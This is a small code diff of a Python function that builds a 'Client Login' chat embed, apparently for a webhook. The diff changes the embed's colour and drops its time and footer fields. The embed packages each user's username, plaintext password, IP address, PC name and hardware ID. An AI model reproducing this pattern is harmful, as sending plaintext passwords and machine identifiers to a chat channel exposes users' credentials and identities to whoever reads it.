@@ -198,19 +198,15 @@ def send_client_login(app_name, username, password, ip, hwid, pc_name):
         "embeds": [
             {
                 "title": "🔐 Client Login",
-                "color": 0x32CD32,
+                "color": 16711680,
                 "fields": [
                     {"name": "Application", "value": app_name, "inline": False},
                     {"name": "Username", "value": username, "inline": False},
                     {"name": "Password", "value": password, "inline": False},
                     {"name": "IP Address", "value": ip, "inline": False},
                     {"name": "PC Name", "value": pc_name, "inline": False},
-                    {"name": "HWID", "value": hwid, "inline": False},
-                    {"name": "Time", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
-                ],
-                "footer": {
-                    "text": "FR Console Client Login"
-                }
+                    {"name": "HWID", "value": hwid, "inline": False}
+                ]
             }
         ]
     }
